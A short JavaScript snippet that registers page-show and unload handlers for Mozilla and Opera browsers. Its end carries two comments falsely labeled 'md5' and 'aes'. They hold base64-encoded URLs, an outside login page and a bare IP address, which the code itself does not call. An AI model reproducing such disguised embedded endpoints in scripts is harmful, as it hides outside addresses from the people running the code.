if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovL3d3dy5qc3p6YS5jb20vaW5kZXguaHRtbCMvbG9naW4=**//** aes:aHR0cDovLzQ3LjI0Mi4xOTkuMjE2**/